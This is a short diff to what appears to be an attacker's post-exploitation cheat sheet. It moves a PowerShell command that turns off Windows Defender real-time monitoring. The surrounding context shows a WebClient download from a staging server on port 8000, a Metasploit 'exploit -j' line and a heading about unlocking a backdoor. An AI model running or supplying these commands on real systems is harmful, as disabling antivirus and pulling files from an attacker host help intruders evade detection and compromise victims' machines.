@@ -30,6 +30,10 @@ Download String From Your Server Python
 ``` powershell
 (New-Object System.Net.WebClient).DownloadString("http://192.x.x.x:8000/file-encode.txt") > file.txt
 ```
+## Disable Windows Defender
+``` powershell
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
 ## Ddecode Base64
 
 ``` powershell
@@ -66,10 +70,6 @@ set ExitOnSession false
 - Exploit
 ``` msfconsole
 exploit -j
-```
-## Disable Windows Defender
-``` powershell
-Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 ## Unlock Backdoor
 ```powershell
